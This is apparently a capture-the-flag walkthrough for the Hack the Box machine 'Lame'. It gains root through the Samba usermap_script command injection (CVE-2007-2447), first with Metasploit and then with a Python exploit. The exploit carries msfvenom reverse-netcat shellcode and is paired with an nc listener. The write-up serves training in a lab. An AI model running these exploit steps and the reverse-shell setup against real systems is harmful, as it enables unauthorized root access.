=======================================================

## Introduction

=======================================================

Lame was one of the very first machines available on the Hack the Box platform.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

To root this machine we will use Metasploit to exploit a vulnerable version of Unix Samba Server documented in CVE-2007-2447.  This particular exploit is a Remote Command Injection Vulnerability and obtains root privileges instantly.
After using Metasploit, we will also find a python script which exploits the same vulnerability, generate our own shellcode using msfvenom, and then run the python script for manual exploitation.

-1- nmap

-2- msfconsole

-3- msf module: exploit/multi/samba/usermap_script

-4- python scripting

-5- msfvenom to generate shellcode for the python script

-6- nc

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with a basic nmap scan to see what ports are open and services are available:

    nmap -A -T4 10.10.10.3

![](/images/lame/2. nmap.png "nmap results")
![](/images/lame/3. nmap_2.png "nmap results")

Here we have ftp, ssh, and smb open.  
Normally it would be worth exploring ftp to see if we can access any files that may contain additional information or credentials we may be able to use on ssh or smb.
Additionally, from what we see here, this appears to be some sort of Debian-based Linux machine.

In this case though we see a Unix Samba version - Samba 3.0.20, so we can do a quick search for exploits against it:

![](/images/lame/4. google_samba_exploit.png "Google: Samba 3.0.20-debian exploit")

So we have a rapid7 (metasploit) result as well as an exploitdb result.  We'll start with the rapid7 one:

## Exploitation using Metasploit

=======================================================

[https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script)

The rapid7 website has the following instructions for using the metasploit module:

![](/images/lame/5. metasploit options.png "rapid7 website")

So let's try them.  Load up msfconsole and follow the steps:

    msfconsole

    use exploit/multi/samba/usermap_script

    show options

![](/images/lame/6. msf_1.png "metasploit")

    set rhosts 10.10.10.3

    show targets

![](/images/lame/7. msf_2.png "metasploit")


We have set the remote host (rhosts, aka the victim machine), and the only target available is Automatic. Let's try and run it.

    run

![](/images/lame/8. msf_3.png "metasploit")

Success!  We are root.  

Notice this shell does not give a prompt after the initial connection. After you see the “Command shell session 1 opened...”  you should have a shell and be able to enter commands.

Let's go get some flags.

    cat /home/makis/user.txt

    cat /root/root.txt

![](/images/lame/9. user_flag.png "user flag")

![](/images/lame/10. root_flag.png "root flag")

And there we have our user and root flags.

## Manual Exploitation

=======================================================

To exploit this machine manually, (aka not through Metasploit), we can now explore the exploit-db entry we found earlier:
[https://www.exploit-db.com/exploits/16320](https://www.exploit-db.com/exploits/16320)

![](/images/lame/11. exploit_db.png "exploit-db entry")

And in this case, the exploit-db entry is the Metasploit module. Let's go back to Google and try to find something elsewhere:

![](/images/lame/12. google.png "google for the win")

Let's try this one as it contains a python script we should be able to modify to our needs:
[https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)


![](/images/lame/13. github_exploit.png "exploit on github")

Click on the "Raw" and then copy/paste the code into your own python file. We can save it as "samba-exploit.py"

In the screenshots here you will see I'm using gedit, but feel free to use your text editor of choice. In your samba-exploit.py file, check out the following section:

![](/images/lame/14. edit_code.png "initial shellode")

Here we need to generate our own shellcode and then use it to replace all the "buf =" and "buf +=" lines.  Let's get to it:

    msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.24 LPORT=9997 -f python

Make sure you use your own IP address for the LHOST. Also, this command may take a few moments to run and generate the shellcode.

![](/images/lame/15. msfvenom.png "msfvenom for shellcode")

Now copy/paste the generated shellcode into your samba-exploit.py:

![](/images/lame/16. edit_shellcode.png "editing the shellcode")

Notice I also replaced the comment above the shellcode with the actual msfvenom command used. This is good practice if we ever need to refer back to this code.

Next, save the samba-exploit.py file and then chmod +x it to make it executable, then we can try and run it with no options:

    chmod +x samba-exploit.py

    ./samba-exploit.py

![](/images/lame/17. chmod.png "chmod the script")

Looks simple - just add the IP address of the target. First though we need to set up our listener to catch the callback. In a separate terminal window, run:

    nc -lvnp 9997   

Note: This port must match whatever port number your chose for LPORT= in your shellcode

![](/images/lame/18. nc_listen.png "listener setup")

Now in the first terminal window we can run the exploit!

    ./samba-exploit.py 10.10.10.3

![](/images/lame/19. samba_exploit.png "execute the exploit")

This will appear to hang, that is normal.  Over in your second terminal window with the nc listener you should see:

![](/images/lame/20. nc_connect.png "nc reverse shell connection")

Notice in the above I already ran the "whoami" command and we are root!  Success!

Let's go get some flags:

![](/images/lame/21. flags.png "flags")

And there you have it, our user and root flags.
